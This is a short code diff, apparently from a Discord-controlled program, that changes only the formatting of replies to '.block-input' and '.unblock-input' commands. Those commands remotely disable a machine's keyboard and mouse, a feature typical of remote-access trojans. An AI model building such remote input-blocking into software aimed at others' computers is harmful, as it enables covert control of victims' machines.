@@ -20,9 +20,9 @@ elif message.content == '.block-input':
     keyboard_listener.start()
     mouse_listener.start()
 
-    await message.channel.send("Input has been blocked. Unblock it by using `.unblock-input`")
+    await message.channel.send("```Input has been blocked. Unblock it by using .unblock-input```")
 
 elif message.content == '.unblock-input':
     keyboard_listener.stop()
     mouse_listener.stop()
-    await message.channel.send("Input has been unblocked.")
+    await message.channel.send("```Input has been unblocked.```")
